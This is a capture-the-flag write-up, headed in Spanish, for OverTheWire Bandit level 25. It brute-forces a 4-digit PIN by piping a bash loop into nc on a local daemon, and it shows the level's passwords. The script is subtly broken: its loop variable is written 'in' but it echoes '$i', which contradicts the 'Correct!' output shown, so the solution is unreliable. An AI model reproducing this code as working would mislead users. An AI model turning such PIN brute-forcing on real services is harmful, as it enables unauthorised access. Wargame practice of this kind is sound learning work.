# Level 25

## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

## Datos de acceso al nivel
User: bandit24
Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
Host: bandit.labs.overthewire.org  
Port: 2220

## Solución
```
bandit24@bandit:~$ cd /tmp/42101656
bandit24@bandit:/tmp/42101656$ nano script.sh
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit24@bandit:/tmp/42101656$ cat script.sh
#!/bin/bash

for in in {0000..9999};
do
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i";
done
bandit24@bandit:/tmp/42101656$ ls -l
total 4
-rw-rw-r-- 1 bandit24 bandit24 90 Feb 27 21:41 script.sh
bandit24@bandit:/tmp/42101656$ chmod +x script.sh
bandit24@bandit:/tmp/42101656$ ./script.sh | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
...
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:/tmp/42101656$
```
## Notas adicionales

## Referencias
